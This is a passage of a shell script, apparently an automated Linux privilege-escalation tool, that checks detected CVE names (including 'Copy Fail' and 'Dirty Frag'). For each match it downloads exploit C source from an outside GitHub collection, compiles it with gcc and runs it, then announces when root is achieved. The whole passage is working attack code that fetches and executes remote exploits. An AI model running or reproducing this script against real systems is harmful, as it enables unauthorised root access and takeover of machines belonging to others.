        "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2025-7771/exploit.c" \
        "cve7771.c" "gcc -static cve7771.c -o cve7771" "./cve7771"

    # CVE-2026-31431 (Copy Fail)
    echo "$NAME" | grep -q "CVE-2026-31431" && _run_exploit "CVE-2026-31431 (Copy Fail)" \
        "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2026-31431/exploit.c" \
        "cve31431.c" "gcc -static cve31431.c -o cve31431" "./cve31431"

    # CVE-2026-43500
    echo "$NAME" | grep -q "CVE-2026-43500" && _run_exploit "CVE-2026-43500 (Dirty Frag)" \
        "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2026-43500/poc.c" \
        "poc43500.c" "gcc poc43500.c -o poc43500 -lutil" "./poc43500"
done

if [ "$_ROOT_ACHIEVED" = true ]; then
    echo
    echo -e "${txtgrn}[+] Privilege escalation successful!${txtrst}"
fi
echo
